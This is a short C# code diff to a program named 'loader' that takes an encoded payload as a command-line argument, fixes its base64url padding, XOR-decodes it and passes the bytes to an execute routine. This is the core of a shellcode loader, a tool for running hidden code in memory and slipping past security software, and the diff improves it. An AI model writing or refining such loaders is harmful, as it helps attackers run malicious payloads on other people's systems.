@@ -12,7 +12,17 @@ namespace loader
                 Console.WriteLine("loader.exe payload");
                 Environment.Exit(0);
             }
-            string str = args[0].TrimEnd('=').Replace('-', '+').Replace('_', '/');
+            string str = args[0].Replace('-', '+').Replace('_', '/');
+            switch (str.Length % 4)
+            {
+                case 2:
+                    str += "==";
+                    break;
+                case 3:
+                    str += "=";
+                    break;
+            }
+            Console.WriteLine(str);
             byte[] code = xor(Convert.FromBase64String(str));
             execute(code);
         }
